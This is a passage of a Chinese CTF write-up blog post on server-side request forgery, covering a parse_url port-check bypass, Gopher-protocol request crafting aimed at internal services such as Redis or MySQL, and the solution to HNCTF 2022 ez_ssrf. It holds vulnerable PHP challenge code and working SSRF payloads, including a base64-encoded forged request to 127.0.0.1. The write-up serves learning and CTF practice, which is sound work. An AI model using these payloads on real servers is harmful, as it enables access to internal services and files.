+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://&#x27;</span>. <span class="variable">$_GET</span>[url];</span><br><span class="line"><span class="variable">$parsed</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$parsed</span>[port] == <span class="number">80</span> )&#123;  <span class="comment">// 这里限制了我们传过去的url只能是80端口的</span></span><br><span class="line">	<span class="title function_ invoke__">readfile</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;Hacker!&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>上述代码限制了我们传过去的url只能是80端口的，但如果我们想去读取11211端口的文件的话，我们可以用以下方法绕过</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssrf.php</span><br><span class="line">    </span><br><span class="line">    ?url=<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">11211</span>:<span class="number">80</span>/flag.txt</span><br></pre></td></tr></table></div></figure>
+
+<p>可以成功读取11211端口flag.txt文件，原理如下图</p>
+<p><img src="/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712190451055.png" alt="image-20230712190451055"></p>
+<p>两个函数解析host也存在差异</p>
+<p><img src="/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/cc15c26e93dfaac450eaa31c71c8d40a.jpeg" alt="1610601347_5fffd383dfc1a3982425f.png!small?1610601348433"></p>
+<p><strong>2.利用curl和parse_url的解析差异绕过指定host</strong></p>
+<p><img src="/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712190638172.png" alt="image-20230712190638172"></p>
+
+        <h3 id="Gopher协议">
+          <a href="#Gopher协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h3>
+      <p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用TCP 70端口</p>
+<p>Gopher协议支持发出GET、POST请求，我们可以先截获GET请求包和POST请求包，再构造成符合Gopher协议请求的payload进行SSRF利用，甚至可以用它来攻击内网中的Redis、MySql、FastCGI等应用，这无疑大大扩展了我们的SSRF攻击面</p>
+<p>Gopher协议格式</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL: gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></div></figure>
+
+<p>注意不要忘记后面那个下划线”<em>“，下划线”</em>“后面才开始接TCP数据流，如果不加这个”_”，那么服务端收到的消息将不是完整的，该字符可随意写。</p>
+<p>如果发起POST请求，回车换行需要使用%0d%0a来代替%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</p>
+<p>利用Gopher协议发送HTTP请求步骤</p>
+<p>在gopher协议中发送HTTP的数据，需要以下三步：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.抓取或构造HTTP数据包</span><br><span class="line">2.URL编码、将回车换行符%0a替换为%0d%0a</span><br><span class="line">3.发送符合gopher协议格式的请求</span><br></pre></td></tr></table></div></figure>
+
+<p>注意这几个问题：</p>
+<pre><code>问号（?）需要转码为URL编码，也就是%3f
+回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a
+在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）
+</code></pre>
+
+        <h1 id="HNCTF-2022-WEEK2-ez-ssrf">
+          <a href="#HNCTF-2022-WEEK2-ez-ssrf" class="heading-link"><i class="fas fa-link"></i></a><a href="#HNCTF-2022-WEEK2-ez-ssrf" class="headerlink" title="[HNCTF 2022 WEEK2]ez_ssrf"></a>[HNCTF 2022 WEEK2]ez_ssrf</h1>
+      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="variable">$port</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>,<span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>),<span class="variable">$error</span>,<span class="variable">$errstr</span>,<span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$data</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>,<span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></div></figure>
+
+<p>这段代码接受通过 GET 请求传递的参数，并使用 <code>fsockopen()</code> 函数建立与指定主机和端口的 socket 连接。然后，它将传入的 base64 编码的数据解码，并将数据写入到连接的 socket 中。接下来，在循环中，它从连接中读取返回的响应数据，并将其输出到浏览器。</p>
+<p>请注意，这段代码存在一些安全风险：</p>
+<ol>
+<li>没有对输入参数进行任何验证和过滤。这可能导致安全漏洞，如远程命令执行和代码注入攻击，请务必加以验证和过滤用户输入。</li>
+<li>关闭 <code>error_reporting</code>，这会隐藏任何可能的错误信息，使得调试和错误处理变得困难，建议在开发和测试阶段启用错误报告以及适当的错误处理。</li>
+</ol>
+<p>建议对该代码进行改进和增强，以提高安全性和代码可靠性。</p>
+<p>** <code>fsockopen()</code> 函数是用于建立一个 socket 连接。该函数的参数包括：</p>
+<ul>
+<li><code>$host</code>：要连接的主机名或 IP 地址。</li>
+<li><code>intval($port)</code>：要连接的端口号，其中 <code>intval()</code> 函数将端口号转换为整数。</li>
+<li><code>$error</code>：一个传入参数，用于获取错误代码（如果有错误发生）。</li>
+<li><code>$errstr</code>：一个传入参数，用于获取错误描述信息（如果有错误发生）。</li>
+<li><code>30</code>：超时时间，以秒为单位。****</li>
+</ul>
+
+        <h3 id="题解">
+          <a href="#题解" class="heading-link"><i class="fas fa-link"></i></a><a href="#题解" class="headerlink" title="题解"></a>题解</h3>
+      <p>首先本地构造一个文件，让他跳转到127.0.0.1，用来伪造请求</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$out = &quot;GET /flag.php HTTP/1.1\r\n&quot;;</span><br><span class="line">$out .= &quot;Host: 127.0.0.1\r\n&quot;;</span><br><span class="line">$out .= &quot;Connection: Keep-Alive\r\n\r\n&quot;;</span><br><span class="line">echo $out;</span><br><span class="line">echo base64_encode($out)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p>我要将这一段信息通过fwrite写进我们的会话中的，这些就是请求头</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: www.wrox.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)</span><br><span class="line">Gecko/20050225 Firefox/1.0.1</span><br><span class="line">Connection: Keep-Alive</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712195039783.png" alt="image-20230712195039783"></p>
+<p>手写一个127.0.0.1的请求头格式，base64编码一下就好</p>
+<p><img src="/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712201519214.png" alt="image-20230712201519214"></p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">playload：？host=<span class="number">127.0</span>.<span class="number">0.1</span>&amp;port=<span class="number">80</span>&amp;data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBLZWVwLUFsaXZlDQoNCg==</span><br></pre></td></tr></table></div></figure></div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="https://qingchuana.github.io">Qingchuan</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="https://qingchuana.github.io/2023/07/22/SSRF%20%20web351-/">https://qingchuana.github.io/2023/07/22/SSRF%20%20web351-/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://qingchuana.github.io/tags/CTF/">CTF</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/07/29/jwtstruts/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">Jwt&amp;struts2</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/07/21/HNCTF%202022%20WEEK2%20%20ez_SSTI/"><span class="paginator-prev__text">HNCTF 2022 WEEK2  ez_SSTI</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF-web351-web360"><span class="toc-number">2.</span> <span class="toc-text">
+          SSRF  web351-web360</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web351"><span class="toc-number">2.1.</span> <span class="toc-text">
+          web351</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web352"><span class="toc-number">2.2.</span> <span class="toc-text">
+          web352</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web353"><span class="toc-number">2.3.</span> <span class="toc-text">
+          web353</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web354"><span class="toc-number">2.4.</span> <span class="toc-text">
+          web354</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web355"><span class="toc-number">2.5.</span> <span class="toc-text">
+          web355</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web356"><span class="toc-number">2.6.</span> <span class="toc-text">
+          web356</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web357"><span class="toc-number">2.7.</span> <span class="toc-text">
+          web357</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web358"><span class="toc-number">2.8.</span> <span class="toc-text">
+          web358</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web359"><span class="toc-number">2.9.</span> <span class="toc-text">
+          web359</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web360"><span class="toc-number">2.10.</span> <span class="toc-text">
+          web360</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">2.11.</span> <span class="toc-text">
+          补充</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gopher%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.11.1.</span> <span class="toc-text">
+          Gopher协议</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HNCTF-2022-WEEK2-ez-ssrf"><span class="toc-number">3.</span> <span class="toc-text">
+          [HNCTF 2022 WEEK2]ez_ssrf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-number">3.0.1.</span> <span class="toc-text">
+          题解</span></a></li></ol></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">Hello Stun</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">36</div><div class="sidebar-ov-state-item__name">归档</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Qingchuan</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v6.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.8.0</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.8.0"></script><script src="/js/stun-boot.js?v=2.8.0"></script><script src="/js/scroll.js?v=2.8.0"></script><script src="/js/header.js?v=2.8.0"></script><script src="/js/sidebar.js?v=2.8.0"></script><script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
